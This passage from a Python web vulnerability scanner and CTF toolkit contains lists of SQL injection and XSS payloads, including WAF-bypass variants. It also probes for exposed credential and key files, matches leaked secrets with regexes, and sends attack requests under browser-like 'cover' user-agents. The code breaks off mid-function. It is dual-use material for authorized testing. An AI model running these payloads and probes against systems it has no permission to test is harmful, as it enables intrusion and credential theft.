#!/usr/bin/env python3
"""
WhiteClaw - Web Security Scanner & CTF Toolkit
Authorized penetration testing and vulnerability discovery tool.
For use only on systems you own or have explicit written permission to test.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import threading
import json
import re
import os
import base64
import urllib.parse
import urllib3
import warnings
from datetime import datetime
from collections import defaultdict
import html as _html_mod
import random
from pathlib import Path

import requests
from bs4 import BeautifulSoup, Comment

# AI provider SDKs — imported lazily so missing ones don't crash startup
try:
    import anthropic as _anthropic_sdk
except ImportError:
    _anthropic_sdk = None

try:
    import openai as _openai_sdk
except ImportError:
    _openai_sdk = None

try:
    from google import genai as _genai_sdk
except ImportError:
    _genai_sdk = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# ─────────────────────────────────────────────────────────────────────────────
# Colour palette (GitHub dark)
# ─────────────────────────────────────────────────────────────────────────────
BG        = "#0d1117"
BG2       = "#161b22"
BG3       = "#21262d"
BG4       = "#30363d"
FG        = "#c9d1d9"
FG2       = "#8b949e"
BLUE      = "#58a6ff"
GREEN     = "#3fb950"
YELLOW    = "#d29922"
RED       = "#f85149"
PURPLE    = "#8957e5"
DARK_GRN  = "#238636"

SEV_COLOR = {
    "CRITICAL": RED,
    "HIGH":     YELLOW,
    "MEDIUM":   BLUE,
    "LOW":      GREEN,
    "INFO":     FG2,
}

# ─────────────────────────────────────────────────────────────────────────────
# Scanner engine
# ─────────────────────────────────────────────────────────────────────────────

COMMON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/graphql", "/graphiql", "/graphql/playground", "/graphql/console",
    "/rest", "/rest/v1", "/rest/v2",
    "/swagger", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml",
    "/api-docs", "/docs/api", "/api/docs",
    "/v1", "/v2", "/v3",
    "/.well-known/openid-configuration",
    "/wp-json", "/wp-json/wp/v2",
    "/admin/api", "/api/admin",
    "/internal/api",
]

SENSITIVE_PATHS = [
    # Critical — credentials / source code
    ("/.env",                    "CRITICAL", "Environment file — may contain DB creds, API keys"),
    ("/.env.local",              "CRITICAL", "Local env file exposed"),
    ("/.env.production",         "CRITICAL", "Production env file exposed"),
    ("/.env.backup",             "CRITICAL", "Backup env file exposed"),
    ("/.env.staging",            "CRITICAL", "Staging env file exposed"),
    ("/.git/HEAD",               "CRITICAL", "Git repository exposed — full source leak possible"),
    ("/.git/config",             "CRITICAL", "Git config exposed"),
    ("/.git/COMMIT_EDITMSG",     "HIGH",     "Git commit message exposed"),
    ("/.git/index",              "CRITICAL", "Git index file exposed — full repo reconstructable"),
    ("/wp-config.php",           "CRITICAL", "WordPress config — DB credentials at risk"),
    ("/wp-config.php.bak",       "CRITICAL", "WordPress config backup exposed"),
    ("/backup.zip",              "CRITICAL", "Backup archive exposed"),
    ("/backup.tar.gz",           "CRITICAL", "Backup archive exposed"),
    ("/backup.sql",              "CRITICAL", "SQL backup exposed"),
    ("/dump.sql",                "CRITICAL", "Database dump exposed"),
    ("/database.sql",            "CRITICAL", "Database SQL exposed"),
    ("/db.sql",                  "CRITICAL", "Database SQL exposed"),
    ("/terraform.tfstate",       "CRITICAL", "Terraform state file — cloud credentials/infra exposed"),
    ("/.terraform/terraform.tfstate", "CRITICAL", "Terraform state file inside .terraform dir"),
    ("/.vault-token",            "CRITICAL", "HashiCorp Vault token exposed"),
    # High — config / admin / debug
    ("/config.php",              "HIGH",     "PHP config file exposed"),
    ("/config.js",               "HIGH",     "JS config file exposed"),
    ("/config.json",             "HIGH",     "JSON config file exposed"),
    ("/config/database.yml",     "HIGH",     "Rails database config — DB creds at risk"),
    ("/config/secrets.yml",      "HIGH",     "Rails secrets file exposed"),
    ("/settings.py",             "HIGH",     "Python settings file exposed"),
    ("/web.config",              "HIGH",     "IIS web.config exposed"),
    ("/phpinfo.php",             "HIGH",     "PHPInfo leaks server internals"),
    ("/info.php",                "HIGH",     "PHP info page exposed"),
    ("/phpmyadmin",              "HIGH",     "phpMyAdmin DB management panel"),
    ("/phpmyadmin/",             "HIGH",     "phpMyAdmin DB management panel"),
    ("/pma",                     "HIGH",     "phpMyAdmin short path"),
    ("/adminer.php",             "HIGH",     "Adminer DB tool exposed"),
    ("/adminer",                 "HIGH",     "Adminer DB tool exposed"),
    ("/trace.axd",               "HIGH",     "ASP.NET trace viewer — request details exposed"),
    ("/elmah.axd",               "HIGH",     "ELMAH error log exposed"),
    ("/_profiler",               "HIGH",     "Symfony profiler — full request/response data exposed"),
    ("/telescope",               "HIGH",     "Laravel Telescope debug dashboard exposed"),
    ("/horizon",                 "HIGH",     "Laravel Horizon queue monitor exposed"),
    ("/storage/logs/laravel.log","HIGH",     "Laravel log file exposed — stack traces leak internals"),
    ("/laravel.log",             "HIGH",     "Laravel log exposed in web root"),
    ("/error.log",               "HIGH",     "Error log exposed — stack traces visible"),
    ("/.ssh/id_rsa",             "CRITICAL", "SSH private key exposed"),
    ("/.ssh/authorized_keys",    "HIGH",     "SSH authorized keys file exposed"),
    ("/private-key.pem",         "CRITICAL", "PEM private key exposed"),
    ("/server.key",              "CRITICAL", "TLS server private key exposed"),
    # Medium
    ("/test.php",                "MEDIUM",   "Test PHP file left on server"),
    ("/server-status",           "MEDIUM",   "Apache server-status exposed"),
    ("/server-info",             "MEDIUM",   "Apache server-info exposed"),
    ("/wp-login.php",            "MEDIUM",   "WordPress login page detected"),
    ("/wp-admin",                "MEDIUM",   "WordPress admin panel"),
    ("/.htaccess",               "MEDIUM",   "htaccess config exposed"),
    ("/crossdomain.xml",         "MEDIUM",   "Flash crossdomain policy"),
    ("/clientaccesspolicy.xml",  "MEDIUM",   "Silverlight client access policy"),
    ("/access.log",              "MEDIUM",   "Access log exposed — visitor IPs/paths visible"),
    # Low / Info
    ("/.DS_Store",               "LOW",      "macOS metadata exposes directory structure"),
    ("/package.json",            "LOW",      "package.json reveals dependency versions"),
    ("/package-lock.json",       "LOW",      "package-lock.json reveals full dependency tree"),
    ("/composer.json",           "LOW",      "composer.json reveals PHP dependency versions"),
    ("/Gemfile",                 "LOW",      "Gemfile reveals Ruby dependency versions"),
    ("/Gemfile.lock",            "LOW",      "Gemfile.lock reveals exact Ruby dependency versions"),
    ("/yarn.lock",               "LOW",      "yarn.lock reveals full JS dependency tree"),
    ("/swagger-ui.html",         "INFO",     "Swagger UI — full API docs publicly visible"),
    ("/api/swagger-ui.html",     "INFO",     "Swagger UI exposed on /api"),
    ("/.well-known/security.txt","INFO",     "security.txt vulnerability disclosure policy"),
    ("/robots.txt",              "INFO",     "robots.txt (checked separately)"),
    ("/sitemap.xml",             "INFO",     "sitemap.xml reveals page structure"),
]

# ── 50 SQL injection payloads ─────────────────────────────────────────────────

SQL_PAYLOADS = [
    # Quote / delimiter
    "'", '"', "`", "\\", "''",
    # Basic OR bypass
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
    "1 OR 1=1", "' OR 1=1--", "admin'--", "' OR 'x'='x",
    "') OR ('1'='1", "') OR 1=1--",
    # UNION-based (column count probes)
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "1 UNION SELECT 1,2,3--",
    "0 UNION ALL SELECT NULL--",
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--", "1 AND 1=1--", "1 AND 1=2--",
    "' AND '1'='1", "' AND '1'='2",
    # Error-based
    "1/0", "1 AND GTID_SUBSET(1,0)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM info--",
    # Time-based blind
    "1 AND SLEEP(1)--", "1 OR SLEEP(1)--",
    "'; WAITFOR DELAY '0:0:1'--",           # MSSQL
    "1; SELECT pg_sleep(1)--",              # PostgreSQL
    "1 AND BENCHMARK(2000000,MD5(1))--",    # MySQL
    # Stacked / OOB hints
    "1; SELECT 1--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    # Encoding / WAF bypass
    "%27", "%22", "0x27", "0x22",
    "' OR 1=1%00",
    "' /*!OR*/ '1'='1",
    "' OR/**/'1'='1",
    # HAVING / ORDER tricks
    "' HAVING 1=1--", "' GROUP BY 1--",
    "' ORDER BY 1--", "' ORDER BY 100--",
    # NoSQL-style injection (passed as-is, server may interpret)
    "' || '1'='1", "1;return true",
    # Extra
    "';SELECT 1;--",
    "' AND EXISTS(SELECT 1 FROM users)--",
]

# ── 50 XSS reflection payloads ────────────────────────────────────────────────

XSS_MARKER = "wh1t3cl4wXSS"   # unique string to detect raw reflection

XSS_PAYLOADS = [
    f"<script>alert('{XSS_MARKER}')</script>",
    f"<img src=x onerror=alert('{XSS_MARKER}')>",
    f"<svg onload=alert('{XSS_MARKER}')>",
    f"<body onload=alert('{XSS_MARKER}')>",
    f"javascript:alert('{XSS_MARKER}')",
    f"\"><script>alert('{XSS_MARKER}')</script>",
    f"'><script>alert('{XSS_MARKER}')</script>",
    f"</script><script>alert('{XSS_MARKER}')</script>",
    f"<img src=\"x\" onerror=\"alert('{XSS_MARKER}')\">",
    f"<input onfocus=alert('{XSS_MARKER}') autofocus>",
    f"<details open ontoggle=alert('{XSS_MARKER}')>",
    f"<video><source onerror=\"alert('{XSS_MARKER}')\">",
    f"<audio src=x onerror=alert('{XSS_MARKER}')>",
    f"<marquee onstart=alert('{XSS_MARKER}')>",
    f"<object data=\"javascript:alert('{XSS_MARKER}')\">",
    f"<iframe src=\"javascript:alert('{XSS_MARKER}')\">",
    f"<embed src=\"javascript:alert('{XSS_MARKER}')\">",
    f"<svg><script>alert('{XSS_MARKER}')</script></svg>",
    f"<svg/onload=alert('{XSS_MARKER}')>",
    f"<img/src=\"x\"/onerror=alert('{XSS_MARKER}')>",
    f"<ScRiPt>alert('{XSS_MARKER}')</ScRiPt>",
    f"<SCRIPT>alert('{XSS_MARKER}')</SCRIPT>",
    f"%3Cscript%3Ealert('{XSS_MARKER}')%3C%2Fscript%3E",
    f"&#60;script&#62;alert('{XSS_MARKER}')&#60;/script&#62;",
    f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{XSS_MARKER}')\">",
    f"<form><button formaction=\"javascript:alert('{XSS_MARKER}')\">X</button></form>",
    f"\"-alert('{XSS_MARKER}')-\"",
    f"'-alert('{XSS_MARKER}')-'",
    f"\\\">{XSS_MARKER}<script>alert(1)</script>",
    f"<style>body{{background:url(\"javascript:alert('{XSS_MARKER}')\")}}</style>",
    f"<div style=\"width:expression(alert('{XSS_MARKER}'))\">",
    f"<xss style=\"xss:expression(alert('{XSS_MARKER}'))\">",
    f"<a href=\"javas&#99;ript:alert('{XSS_MARKER}')\">click</a>",
    f"<math><a xlink:href=\"javascript:alert('{XSS_MARKER}')\">click",
    f"<!--<script>--><script>alert('{XSS_MARKER}')</script>",
    f"<![CDATA[<script>alert('{XSS_MARKER}')</script>]]>",
    f"<script>/*</script><script>*/alert('{XSS_MARKER}')</script>",
    f"<input type=image src=x onerror=alert('{XSS_MARKER}')>",
    f"<link rel=stylesheet href=\"javascript:alert('{XSS_MARKER}')\">",
    f"<table background=\"javascript:alert('{XSS_MARKER}')\">",
    f"<isindex type=image src=1 onerror=alert('{XSS_MARKER}')>",
    f"<select onfocus=alert('{XSS_MARKER}') autofocus>",
    f"<textarea onfocus=alert('{XSS_MARKER}') autofocus>",
    f"<keygen onfocus=alert('{XSS_MARKER}') autofocus>",
    f"<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('{XSS_MARKER}')\">XSS</a>",
    f"<img src=x oNeRrOr=alert('{XSS_MARKER}')>",
    f"<img src=`x` onerror=alert('{XSS_MARKER}')>",
    f"{XSS_MARKER}<script>alert(1)</script>",
    f"\x00<script>alert('{XSS_MARKER}')</script>",
    XSS_MARKER,    # bare marker — detects raw reflection without HTML
]

DATABASE_ENDPOINTS = [
    ("/phpmyadmin",     "phpMyAdmin"),
    ("/phpmyadmin/",    "phpMyAdmin"),
    ("/pma",            "phpMyAdmin"),
    ("/adminer.php",    "Adminer"),
    ("/adminer",        "Adminer"),
    ("/pgadmin",        "pgAdmin"),
    ("/pgadmin4",       "pgAdmin 4"),
    ("/pgadmin4/browser", "pgAdmin 4 Browser"),
    ("/mongo-express",  "Mongo Express"),
    ("/mongoexpress",   "Mongo Express"),
    ("/redis",          "Redis Web UI"),
    ("/redisinsight",   "RedisInsight"),
    ("/kibana",         "Kibana (Elasticsearch)"),
    ("/_cat",           "Elasticsearch Cat API"),
    ("/_cluster",       "Elasticsearch Cluster API"),
    ("/couchdb",        "CouchDB"),
    ("/influxdb",       "InfluxDB"),
]

DB_PORT_PATHS = [
    (":9200", "Elasticsearch"),
    (":9300", "Elasticsearch Node"),
    (":27017", "MongoDB"),
    (":5432", "PostgreSQL"),
    (":3306", "MySQL/MariaDB"),
    (":6379", "Redis"),
    (":5984", "CouchDB"),
    (":8086", "InfluxDB"),
    (":8888", "Jupyter Notebook"),
]

JS_SECRET_PATTERNS = [
    (r'(?i)api[_\-]?key\s*[=:]\s*["\']([^"\']{8,})["\']',          "API Key"),
    (r'(?i)api[_\-]?secret\s*[=:]\s*["\']([^"\']{8,})["\']',       "API Secret"),
    (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']{4,})["\']',"Password"),
    (r'(?i)secret[_\-]?key\s*[=:]\s*["\']([^"\']{8,})["\']',       "Secret Key"),
    (r'(?i)(?:auth|access)[_\-]?token\s*[=:]\s*["\']([^"\']{8,})["\']', "Auth Token"),
    (r'(?i)private[_\-]?key\s*[=:]\s*["\']([^"\']{8,})["\']',      "Private Key"),
    (r'AKIA[0-9A-Z]{16}',                                            "AWS Access Key ID"),
    (r'(?i)aws[_\-]?secret\s*[=:]\s*["\']([A-Za-z0-9+/]{40})["\']',"AWS Secret Key"),
    (r'mongodb(?:\+srv)?://[^\s"\'<>]+',                             "MongoDB Connection String"),
    (r'mysql://[^\s"\'<>]+',                                         "MySQL Connection String"),
    (r'postgres(?:ql)?://[^\s"\'<>]+',                               "PostgreSQL Connection String"),
    (r'redis://[^\s"\'<>]+',                                         "Redis Connection String"),
    (r'amqp://[^\s"\'<>]+',                                          "AMQP/RabbitMQ Connection String"),
    (r'(?i)bearer\s+([A-Za-z0-9\-_]{20,})',                         "Bearer Token"),
    (r'(?i)private_token\s*[=:]\s*["\']([^"\']{8,})["\']',         "Private Token"),
    (r'ghp_[A-Za-z0-9]{36}',                                        "GitHub PAT"),
    (r'ghs_[A-Za-z0-9]{36}',                                        "GitHub Service Token"),
    (r'sk-[A-Za-z0-9]{48}',                                         "OpenAI API Key"),
    (r'xox[baprs]-[A-Za-z0-9\-]+',                                  "Slack Token"),
]

SQL_ERROR_STRINGS = [
    "you have an error in your sql", "warning: mysql", "mysql_fetch",
    "mysql_num_rows", "pg_query", "pg_exec", "sqlite3", "sqlstate",
    "ora-0", "microsoft sql server", "odbc sql server", "unclosed quotation",
    "syntax error", "sql syntax", "unexpected token", "column not found",
    "table or view not found", "division by zero",
]

# ─────────────────────────────────────────────────────────────────────────────
# CTF Solver — constants
# ─────────────────────────────────────────────────────────────────────────────

FLAG_RE = re.compile(
    r'(?i)(?:flag|ctf|picoctf|htb|thm|ductf|uiuctf|nahamcon|pctf|wgmy|corctf|dctf|'
    r'rgbctf|lactf|secureflag|intigriti|crypto)\{[^}]{1,300}\}'
)

ENGLISH_FREQ: dict[str, float] = {
    'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0, 'n': 6.7,
    's': 6.3, 'h': 6.1, 'r': 6.0, 'd': 4.3, 'l': 4.0, 'c': 2.8,
    'u': 2.8, 'm': 2.4, 'w': 2.4, 'f': 2.2, 'g': 2.0, 'y': 2.0,
    'p': 1.9, 'b': 1.5, 'v': 1.0, 'k': 0.8, 'j': 0.2, 'x': 0.2,
    'q': 0.1, 'z': 0.1,
}

MORSE_TABLE: dict[str, str] = {
    '.-': 'A',   '-...': 'B', '-.-.': 'C', '-..': 'D',  '.': 'E',
    '..-.': 'F', '--.': 'G',  '....': 'H', '..': 'I',   '.---': 'J',
    '-.-': 'K',  '.-..': 'L', '--': 'M',   '-.': 'N',   '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R',  '...': 'S',  '-': 'T',
    '..-': 'U',  '...-': 'V', '.--': 'W',  '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '.----': '1','..---': '2','...--': '3','....-': '4',
    '.....': '5','-....': '6','--...': '7','---..': '8','----.': '9',
    '-----': '0',
}

BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

# Precomputed lookup tables for CTF solver hot paths (built once at import time)
_XOR_FREQ_TBL: list[int] = [
    int(ENGLISH_FREQ.get(chr(b).lower(), 0.0) * 1000) if chr(b).isalpha() else 0
    for b in range(256)
]
_XOR_PRINT_TBL: list[int] = [
    1 if (32 <= b <= 126 or b in (9, 10, 13)) else 0
    for b in range(256)
]
_ROT47_TABLE = str.maketrans(
    ''.join(chr(c) for c in range(33, 127)),
    ''.join(chr(33 + (c - 33 + 47) % 94) for c in range(33, 127)),
)

# ─────────────────────────────────────────────────────────────────────────────
# Traffic cover — browser-like UAs used for all attack/probe requests
# ─────────────────────────────────────────────────────────────────────────────

COVER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 h1whiteclaw",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 h1whiteclaw",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 h1whiteclaw",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0 h1whiteclaw",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 h1whiteclaw",
]


class WhiteClawScanner:
    """Core scanning engine — all methods populate self.findings."""

    def __init__(self, url: str, callback):
        self.url = url
        self.base_url = self._base(url)
        self.callback = callback  # callback(event_type, data)
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "WhiteClaw/1.0 (Authorized Security Testing)",
            "Accept": "text/html,application/xhtml+xml,application/json,*/*;q=0.9",
        })
        self.session.max_redirects = 5
        # Separate session for attack/probe requests — uses browser-like cover UA
        self.attack_session = self._make_attack_session()
        self.main_response = None
        self.main_soup = None
        self.findings: dict[str, list] = defaultdict(list)

    # ── helpers ──────────────────────────────────────────────────────────────

    def _base(self, url: str) -> str:
        p = urllib.parse.urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def _get(self, url: str, timeout: int = 8, **kw) -> requests.Response | None:
        try:
            return self.session.get(url, timeout=timeout, verify=False,
                                    allow_redirects=kw.get("follow", True), **
                                    {k: v for k, v in kw.items() if k != "follow"})
        except Exception:
            return None

    def _log(self, category: str, severity: str, title: str,
             detail: str = "", fix: str = "") -> None:
        finding = {
            "category":  category,
            "severity":  severity,
            "title":     title,
            "detail":    detail,
            "fix":       fix,
            "timestamp": datetime.now().isoformat(),
        }
        self.findings[category].append(finding)
        self.callback("finding", finding)

    def _status(self, msg: str) -> None:
        self.callback("status", msg)

    def _make_attack_session(self) -> requests.Session:
        """Session with browser-like cover UA for all attack/probe requests."""
        s = requests.Session()
        s.headers.update({
            "User-Agent":               random.choice(COVER_AGENTS),
            "Accept":                   "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language":          "en-US,en;q=0.9",
            "Accept-Encoding":          "gzip, deflate",
            "Connection":               "keep-alive",
            "Upgrade-Insecure-Requests":"1",
        })
        s.max_redirects = 3
        return s

    def _attack_get(self, url: str, timeout: int = 8, **kw) -> requests.Response | None:
        """GET via the cover-UA attack session."""
        try:
            return self.attack_session.get(
                url, timeout=timeout, verify=False,
                allow_redirects=kw.get("follow", True),
                **{k: v for k, v in kw.items() if k != "follow"},
            )
        except Exception:
            return None

    # ── orchestration ────────────────────────────────────────────────────────

    def run(self) -> None:
        steps = [
            ("Fetching target page",           self._fetch_main),
            ("Analysing HTTP headers",          self._check_headers),
            ("Checking security headers",       self._check_security_headers),
            ("Analysing cookies",               self._check_cookies),
            ("Testing CORS policy",             self._check_cors),
            ("Discovering API endpoints",       self._discover_apis),
            ("Scanning JavaScript files",       self._scan_js),
            ("Probing sensitive files",         self._check_sensitive_files),
            ("Probing database interfaces",     self._probe_databases),
            ("Testing SQL injection (50 payloads)", self._test_sqli),
            ("Testing XSS reflection (50 payloads)", self._test_xss),
            ("Checking open redirect",          self._test_open_redirect),
            ("Testing HTTP methods",            self._test_http_methods),
            ("Testing path traversal",          self._test_path_traversal),
            ("Probing SSRF vectors",            self._test_ssrf),
            ("Inspecting forms",                self._analyze_forms),
            ("Mining CTF / hidden artifacts",   self._mine_ctf),
            ("Reading robots.txt / sitemap",    self._check_robots_sitemap),
        ]
        total = len(steps)
        for i, (label, fn) in enumerate(steps, 1):
            self._status(f"[{i}/{total}] {label}…")
            try:
                fn()
            except Exception as exc:
                self.callback("error", f"{label} failed: {exc}")
        self.callback("done", dict(self.findings))

    # ── fetch main page ───────────────────────────────────────────────────────

    def _fetch_main(self) -> None:
        resp = self._get(self.url)
        if resp is None:
            raise RuntimeError(f"Cannot reach {self.url}")
        self.main_response = resp
        self.main_soup = BeautifulSoup(resp.text, "html.parser")
        self._log("info", "INFO", "Target reachable",
                  f"Status {resp.status_code} · {len(resp.content):,} bytes · "
                  f"Content-Type: {resp.headers.get('Content-Type','?')}")

    # ── header analysis ───────────────────────────────────────────────────────

    def _check_headers(self) -> None:
        h = self.main_response.headers

        if "Server" in h:
            self._log("vulnerabilities", "MEDIUM", "Server header discloses version",
                      f"Server: {h['Server']}",
                      "Set `ServerTokens Prod` (Apache) or `server_tokens off` (Nginx) "
                      "to hide version details.")

        if "X-Powered-By" in h:
            self._log("vulnerabilities", "MEDIUM", "Technology stack disclosed via X-Powered-By",
                      f"X-Powered-By: {h['X-Powered-By']}",
                      "Remove this header. Express.js: `app.disable('x-powered-by')`.")

        if "X-AspNet-Version" in h:
            self._log("vulnerabilities", "MEDIUM", "ASP.NET version disclosed",
                      f"X-AspNet-Version: {h['X-AspNet-Version']}",
                      "Set `<httpRuntime enableVersionHeader='false'/>` in web.config.")

        if "X-Debug-Token" in h or "X-Debug-Token-Link" in h:
            self._log("vulnerabilities", "HIGH", "Symfony debug token exposed",
                      "Symfony profiler debug token in response headers — full request data accessible.",
                      "Disable the Symfony profiler in production (APP_ENV=prod).")

    def _check_security_headers(self) -> None:
        h = self.main_response.headers
        hl = {k.lower(): v for k, v in h.items()}

        # ── missing headers ────────────────────────────────────────────────────
        missing_checks = [
            ("Strict-Transport-Security",   "HIGH",
             "HSTS missing — vulnerable to SSL stripping / downgrade attacks.",
             "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
            ("X-Frame-Options",             "HIGH",
             "Clickjacking protection missing — page can be embedded in iframes.",
             "Add: X-Frame-Options: DENY (or use CSP frame-ancestors 'none')"),
            ("X-Content-Type-Options",      "MEDIUM",
             "MIME-sniffing not disabled — browsers may execute mistyped content.",
             "Add: X-Content-Type-Options: nosniff"),
            ("Content-Security-Policy",     "HIGH",
             "No CSP header — XSS has no browser-level mitigation.",
             "Add a strict Content-Security-Policy restricting script-src, object-src, etc."),
            ("Referrer-Policy",             "MEDIUM",
             "No Referrer-Policy — full URL sent to third parties in Referer header.",
             "Add: Referrer-Policy: strict-origin-when-cross-origin"),
            ("Permissions-Policy",          "LOW",
             "No Permissions-Policy — camera, mic, geolocation APIs unrestricted.",
             "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()"),
            ("Cross-Origin-Opener-Policy",  "MEDIUM",
             "No COOP — page can be targeted by cross-origin window attacks.",
             "Add: Cross-Origin-Opener-Policy: same-origin"),
            ("Cross-Origin-Embedder-Policy","LOW",
             "No COEP — SharedArrayBuffer / high-resolution timers may be accessible.",
             "Add: Cross-Origin-Embedder-Policy: require-corp"),
            ("Cross-Origin-Resource-Policy","LOW",
             "No CORP — resources may be embeddable by cross-origin sites.",
             "Add: Cross-Origin-Resource-Policy: same-origin"),
            ("X-Permitted-Cross-Domain-Policies", "LOW",
             "No X-Permitted-Cross-Domain-Policies — Flash/PDF crossdomain access unrestricted.",
             "Add: X-Permitted-Cross-Domain-Policies: none"),
            ("X-DNS-Prefetch-Control",      "LOW",
             "No X-DNS-Prefetch-Control — DNS prefetching may leak visited links.",
             "Add: X-DNS-Prefetch-Control: off"),
            ("Cache-Control",               "LOW",
             "No Cache-Control — sensitive pages may be cached by proxies / browsers.",
             "Add: Cache-Control: no-store for authenticated/sensitive pages"),
            ("Clear-Site-Data",             "INFO",
             "No Clear-Site-Data header — logout pages should clear caches/cookies.",
             "On logout endpoint add: Clear-Site-Data: \"cache\",\"cookies\",\"storage\""),
        ]
        for header, sev, detail, fix in missing_checks:
            if header not in h:
                self._log("vulnerabilities", sev, f"Missing header: {header}", detail, fix)

        # ── misconfigured header values ────────────────────────────────────────

        hsts = hl.get("strict-transport-security", "")
        if hsts:
            if "max-age" not in hsts:
                self._log("vulnerabilities", "HIGH", "HSTS present but no max-age",
                          f"Value: {hsts}",
                          "Set max-age to at least 31536000 (1 year).")
            else:
                try:
                    age = int(re.search(r"max-age=(\d+)", hsts).group(1))
                    if age < 31536000:
                        self._log("vulnerabilities", "MEDIUM", "HSTS max-age too short",
                                  f"max-age={age} (< 1 year)",
                                  "Set max-age=31536000 or higher.")
                except Exception:
                    pass
            if "includesubdomains" not in hsts.lower():
                self._log("vulnerabilities", "LOW", "HSTS missing includeSubDomains",
                          f"Value: {hsts}",
                          "Add includeSubDomains to protect all subdomains.")

        csp = hl.get("content-security-policy", "")
        if csp:
            for bad, label in [("'unsafe-inline'", "unsafe-inline in CSP"),
                                ("'unsafe-eval'",   "unsafe-eval in CSP"),
                                ("*",               "wildcard source in CSP")]:
                if bad in csp:
                    self._log("vulnerabilities", "HIGH", f"Dangerous CSP directive: {label}",
                              f"CSP: {csp[:200]}",
                              f"Remove '{bad}' — it negates XSS protection.")

        xfo = hl.get("x-frame-options", "")
        if xfo and xfo.upper() not in ("DENY", "SAMEORIGIN"):
            self._log("vulnerabilities", "MEDIUM", "Weak X-Frame-Options value",
                      f"Value: {xfo} (should be DENY or SAMEORIGIN)",
                      "Use DENY unless same-origin framing is required.")

        xxp = hl.get("x-xss-protection", "")
        if xxp and xxp.strip() not in ("0", "1; mode=block"):
            self._log("vulnerabilities", "LOW", "Non-standard X-XSS-Protection value",
                      f"Value: {xxp} — this header is deprecated; rely on CSP instead.",
                      "Remove X-XSS-Protection and use a strict Content-Security-Policy.")

        rp = hl.get("referrer-policy", "")
        if rp and rp.lower() in ("unsafe-url", "no-referrer-when-downgrade"):
            self._log("vulnerabilities", "MEDIUM", "Overly permissive Referrer-Policy",
                      f"Value: {rp} — full URLs sent to third parties.",
                      "Use strict-origin-when-cross-origin or stricter.")

        ct = hl.get("content-type", "")
        if ct and "charset" not in ct.lower() and "text/html" in ct.lower():
            self._log("vulnerabilities", "LOW", "Content-Type missing charset",
                      f"Value: {ct}",
                      "Add ; charset=utf-8 to prevent charset sniffing attacks.")

        # ── information-leaking headers ────────────────────────────────────────
        for leak_hdr, label, sev in [
            ("server",           "Server", "MEDIUM"),
            ("x-powered-by",     "X-Powered-By", "MEDIUM"),
            ("x-aspnet-version", "X-AspNet-Version", "MEDIUM"),
            ("x-aspnetmvc-version", "X-AspNetMvc-Version", "MEDIUM"),
            ("x-generator",      "X-Generator", "LOW"),
            ("x-drupal-cache",   "X-Drupal-Cache (Drupal detected)", "LOW"),
            ("x-wp-nonce",       "X-WP-Nonce (WordPress API detected)", "LOW"),
        ]:
            val = hl.get(leak_hdr, "")
            if val:
                self._log("vulnerabilities", sev,
                          f"Technology disclosure via {label}",
                          f"{label}: {val}",
                          f"Remove or suppress the {label} header in server config.")

        if "x-debug-token" in hl or "x-debug-token-link" in hl:
            self._log("vulnerabilities", "HIGH", "Symfony debug token in response",
                      "Full request profiler data may be accessible.",
                      "Set APP_ENV=prod to disable the Symfony profiler.")

    # ── cookies ───────────────────────────────────────────────────────────────

    def _check_cookies(self) -> None:
        for c in self.session.cookies:
            issues = []
            extra = {k.lower(): v for k, v in c._rest.items()} if hasattr(c, "_rest") else {}
            if "httponly" not in extra:
                issues.append("HttpOnly missing (JavaScript can read this cookie)")
            if not c.secure:
                issues.append("Secure flag missing (sent over plain HTTP)")
            if "samesite" not in extra:
                issues.append("SameSite not set (cross-site request forgery risk)")
            if issues:
                self._log("vulnerabilities", "MEDIUM",
                          f"Insecure cookie: {c.name}",
                          " | ".join(issues),
                          "Set cookies with `HttpOnly; Secure; SameSite=Strict`.")

    # ── CORS ──────────────────────────────────────────────────────────────────

    def _check_cors(self) -> None:
        resp = self._get(self.url, headers={"Origin": "https://evil-attacker.com"})
        if resp is None:
            return
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()

        if acao == "*":
            self._log("vulnerabilities", "HIGH", "CORS wildcard origin (*)",
                      "Any site can read API responses — credentials may leak cross-origin.",
                      "Replace `*` with an explicit allowlist of trusted origins.")
        elif "evil-attacker.com" in acao:
